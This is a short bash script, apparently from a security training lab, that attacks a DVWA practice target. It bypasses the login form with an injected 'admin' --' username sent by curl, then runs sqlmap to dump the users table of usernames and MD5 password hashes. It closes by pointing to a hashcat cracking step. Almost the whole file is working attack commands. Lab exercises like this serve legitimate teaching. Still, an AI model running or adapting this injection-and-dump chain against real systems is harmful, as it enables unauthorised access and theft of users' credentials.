#!/bin/bash
# sqli.sh — real SQL injection against the DVWA target (Case 03).
#
# Step 1: tautology payload bypasses the login form.
# Step 2: sqlmap dumps the users table (username / MD5 hash rows).
#
# Requires DVWA to be set up once first:
#   open http://localhost:8080/setup.php -> "Create / Reset Database"
#   log in admin/password
set -u

DVWA_URL="${1:-http://192.168.10.20}"

echo "======================================================================"
echo "[1/2] login bypass — ' OR 1=1 tautology via the user field"
echo "======================================================================"
curl -s -c /tmp/dvwa.cookies \
  -d "username=admin' -- &password=whatever&Login=Login" \
  "$DVWA_URL/login.php"
echo "(expected: DVWA redirects to /index.php => authenticated as admin)"
echo

echo "======================================================================"
echo "[2/2] sqlmap automatically dumps the users table"
echo "======================================================================"
sqlmap -u "$DVWA_URL/login.php" \
  --method POST \
  --data 'username=admin&password=x&Login=Login' \
  --batch \
  --cookie "$(awk '!/^#/ && NF>=7 {printf "%s=%s; ", $6, $7}' /tmp/dvwa.cookies 2>/dev/null)" \
  --dbms mysql --threads=3 \
  --technique=B --risk=1 --level=2 \
  --dump -T users || echo "(if this errored: run DVWA setup first, see header note)"

echo
echo "[*] copy the dumped hashes to /tmp/hashes.txt, then:"
echo "    hashcat-run.sh"